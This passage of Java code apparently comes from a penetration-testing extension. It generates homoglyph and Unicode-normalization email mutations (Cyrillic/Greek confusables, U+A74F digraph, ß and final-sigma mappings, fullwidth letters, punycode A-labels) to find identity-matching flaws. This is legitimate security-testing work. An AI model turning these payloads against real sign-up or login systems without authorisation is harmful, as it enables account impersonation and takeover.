                    "Literal xn-- A-label counterpart for the PVALID Latin U-label; compare direct A-label account lookup with Unicode-input routing.",
                    false, c -> rawALabelForReplacement(c, from, to)));
        }

        // Multi-letter Unicode code points that visually/semantically resemble ASCII digraphs.
        // U+A74F LATIN SMALL LETTER OO is IDNA2008 PVALID, but it is not NFKC-equivalent to ASCII "oo".
        // These cases therefore probe application-specific skeleton/digraph folding and U-label/A-label
        // disagreement rather than ordinary Unicode compatibility normalization.
        out.add(m("PVALID-DIGRAPH-001", "IDNA2008 PVALID digraphs",
                "Domain oo -> ꝏ (U+A74F LATIN SMALL LETTER OO)",
                "Replaces the first ASCII oo sequence in the first domain label with IDNA2008-PVALID U+A74F LATIN SMALL LETTER OO. Useful for yahoo-style labels and custom digraph/confusable folding differentials.",
                false, c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "oo", "ꝏ")));
        out.add(mw("PVALID-DIGRAPH-J-001", "IDNA2008 PVALID digraphs JSON wire",
                "Domain oo -> ꝏ as JSON Unicode escape",
                "JSON-wire counterpart of the U+A74F LATIN SMALL LETTER OO digraph probe.",
                false, MutationCase.WireMode.JSON_UNICODE_ESCAPED,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "oo", "ꝏ")));
        out.add(m("PVALID-DIGRAPH-A-001", "IDNA2008 PVALID A-label controls",
                "A-label control for oo -> ꝏ",
                "Literal xn-- A-label counterpart for the U+A74F LATIN SMALL LETTER OO U-label.",
                false, c -> rawALabelForReplacement(c, "oo", "ꝏ")));

        // Two characters are especially important because UTS #46 transitional processing maps them
        // differently from non-transitional IDNA2008: ß -> ss and final sigma ς -> σ.
        String[][] pvalidTransitional = {
                {"ss", "ß", "U+00DF sharp s; transitional mapping ß -> ss"},
                {"σ", "ς", "U+03C2 final sigma; transitional mapping ς -> σ"}
        };
        for (int i = 0; i < pvalidTransitional.length; i++) {
            final String from = pvalidTransitional[i][0];
            final String to = pvalidTransitional[i][1];
            final String description = pvalidTransitional[i][2];
            final String suffix = String.format("%03d", i + 1);
            out.add(m("PVALID-MAP-" + suffix, "IDNA2008 UTS46 transitional mappings",
                    from + " -> " + to,
                    "High-value IDNA2008/UTS46 differential: " + description + ". The case is skipped when the source sequence is absent from the first domain label.",
                    false, c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), from, to)));
            out.add(mw("PVALID-MAP-J-" + suffix, "IDNA2008 UTS46 transitional mappings",
                    from + " -> " + to + " as JSON Unicode escape",
                    "JSON-wire form of the IDNA2008/UTS46 transitional differential: " + description + ".",
                    false, MutationCase.WireMode.JSON_UNICODE_ESCAPED,
                    c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), from, to)));
            out.add(m("PVALID-MAP-A-" + suffix, "IDNA2008 PVALID A-label controls",
                    "A-label control for " + from + " -> " + to,
                    "Literal A-label counterpart for the UTS46 transitional-mapping candidate.",
                    false, c -> rawALabelForReplacement(c, from, to)));
        }

        // PVALID cross-script confusables are negative/heuristic controls: normal IDNA does not map
        // these to ASCII, but custom skeleton/confusable matching sometimes does. They are useful
        // precisely because the resulting U-label has a legitimate IDNA2008 A-label representation.
        String[][] pvalidConfusables = {
                {"a", "а", "CYRILLIC SMALL LETTER A"},
                {"a", "α", "GREEK SMALL LETTER ALPHA"},
                {"c", "с", "CYRILLIC SMALL LETTER ES"},
                {"e", "е", "CYRILLIC SMALL LETTER IE"},
                {"h", "һ", "CYRILLIC SMALL LETTER SHHA"},
                {"i", "і", "CYRILLIC SMALL LETTER BYELORUSSIAN-UKRAINIAN I"},
                {"l", "ӏ", "CYRILLIC SMALL LETTER PALOCHKA"},
                {"o", "о", "CYRILLIC SMALL LETTER O"},
                {"o", "ο", "GREEK SMALL LETTER OMICRON"},
                {"y", "у", "CYRILLIC SMALL LETTER U"}
        };
        for (int i = 0; i < pvalidConfusables.length; i++) {
            final String from = pvalidConfusables[i][0];
            final String to = pvalidConfusables[i][1];
            final String unicodeName = pvalidConfusables[i][2];
            final String suffix = String.format("%03d", i + 1);
            out.add(m("PVALID-CONF-" + suffix, "IDNA2008 PVALID confusables",
                    "Domain " + from + " -> " + to + " (" + unicodeName + ")",
                    "IDNA2008-PVALID confusable control for detecting non-standard skeleton/confusable identity matching. Mixed-script registry policy may still reject the resulting label.",
                    false, c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), from, to)));
            out.add(mw("PVALID-CONF-J-" + suffix, "IDNA2008 PVALID confusables JSON wire",
                    "Domain " + from + " -> " + to + " as JSON Unicode escape",
                    "JSON-wire form of the PVALID confusable candidate.",
                    false, MutationCase.WireMode.JSON_UNICODE_ESCAPED,
                    c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), from, to)));
            out.add(m("PVALID-CONF-A-" + suffix, "IDNA2008 PVALID A-label controls",
                    "A-label control for " + from + " -> " + to,
                    "Literal A-label counterpart of the PVALID confusable U-label.",
                    false, c -> rawALabelForReplacement(c, from, to)));
        }

        // Fullwidth Latin alphabet sweep. Each case mutates only the first domain label. Cases whose
        // source letter is absent become not-applicable and are skipped by the runner; the Collaborator
        // correlation suffix is never modified.
        String asciiLetters = "abcdefghijklmnopqrstuvwxyz";
        String fullwidthLetters = "ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ";
        for (int i = 0; i < asciiLetters.length(); i++) {
            String from = String.valueOf(asciiLetters.charAt(i));
            String to = String.valueOf(fullwidthLetters.charAt(i));
            String id = String.format("WIDTH-%03d", i + 1);
            out.add(m(id, "Unicode width-folding sweep", "Domain " + from + " -> " + to,
                    "Systematic NFKC/width-folding probe across ASCII letters in the domain.", false,
                    c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), from, to)));
        }

        return Collections.unmodifiableList(out);
    }


    /**
     * Replace only inside the first domain label. This is important for persistent Collaborator
     * accounts such as yahoo.<payload>.oastify.com: normalization probes must never mutate the
     * Collaborator correlation suffix. If the source sequence is absent, return the canonical
     * address unchanged so the runner can mark the case not-applicable instead of fuzzing the OAST root.
     */
    private static String replaceFirstOrAppend(String local, String domain, String from, String to) {
        int dot = domain.indexOf('.');
        String first = dot >= 0 ? domain.substring(0, dot) : domain;
        String rest = dot >= 0 ? domain.substring(dot) : "";
        int i = first.indexOf(from);
        if (i < 0) return local + "@" + domain;
        String mutated = first.substring(0, i) + to + first.substring(i + from.length());
        return local + "@" + mutated + rest;
    }

    private static String replaceFirstLocal(MutationContext c, String from, String to) {
        int i = c.localPart().indexOf(from);
        String local = i >= 0
                ? c.localPart().substring(0, i) + to + c.localPart().substring(i + from.length())
                : c.localPart() + to;
        return local + "@" + c.allowedDomain();
    }

    private static String replaceFirstDomainSeparator(MutationContext c, String replacement) {
        int i = c.allowedDomain().indexOf('.');
        String domain = i >= 0
                ? c.allowedDomain().substring(0, i) + replacement + c.allowedDomain().substring(i + 1)
                : c.allowedDomain() + replacement + "invalid";
        return c.localPart() + "@" + domain;
    }

    private static String replaceDomainSequence(MutationContext c, String from, String to) {
        return replaceFirstOrAppend(c.localPart(), c.allowedDomain(), from, to);
    }

    private static String insertIntoFirstDomainLabel(MutationContext c, String insertion) {
        String domain = c.allowedDomain();
        int dot = domain.indexOf('.');
        int labelEnd = dot >= 0 ? dot : domain.length();
        int pos = Math.max(1, labelEnd / 2);
        String mutated = domain.substring(0, pos) + insertion + domain.substring(pos);
        return c.localPart() + "@" + mutated;
    }


    private static String rawALabelForReplacement(MutationContext c, String from, String to) {
        String domain = c.allowedDomain();
        int dot = domain.indexOf('.');
        String first = dot >= 0 ? domain.substring(0, dot) : domain;
        String rest = dot >= 0 ? domain.substring(dot) : "";
        int i = first.indexOf(from);
        if (i < 0) return c.canonicalEmail();
        String unicode = first.substring(0, i) + to + first.substring(i + from.length());
        return c.localPart() + "@" + RawPunycode.toRawALabel(unicode) + rest;
    }

    private static MutationCase m(String id, String family, String label, String intent,
                                  boolean collaborator, MutationCase.Generator generator) {
        return new MutationCase(id, family, label, intent, collaborator, generator);
    }

    private static MutationCase mw(String id, String family, String label, String intent,
                                   boolean collaborator, MutationCase.WireMode wireMode,
                                   MutationCase.Generator generator) {
        return new MutationCase(id, family, label, intent, collaborator, wireMode, generator);
    }
}
